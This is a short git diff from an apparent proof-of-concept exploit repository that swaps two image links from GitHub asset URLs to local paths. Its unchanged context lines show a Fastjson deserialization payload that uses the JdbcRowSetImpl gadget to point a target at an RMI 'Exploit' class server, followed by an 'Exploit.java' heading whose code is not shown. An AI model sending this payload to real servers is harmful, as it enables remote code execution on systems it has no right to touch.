@@ -25,9 +25,9 @@ Content-Length: 196
 uiSetup={"a":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl" }, "b":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://127.0.0.1:1389/Exploit", "autoCommit":true}}
 
 ```
-![a8ac139413588a49d844ca534afce1ed](https://github.com/wy876/POC/assets/139549762/773d195f-9171-4783-956b-4db556f93aae)
+![a8ac139413588a49d844ca534afce1ed](../../images/773d195f-9171-4783-956b-4db556f93aae.png)
 
-![bb988d242c8d788aca44bd3e22f2650b](https://github.com/wy876/POC/assets/139549762/15be1a39-4102-4864-8cae-71e21e56187b)
+![bb988d242c8d788aca44bd3e22f2650b](../../images/15be1a39-4102-4864-8cae-71e21e56187b.png)
 
 ### Exploit.java
 ```
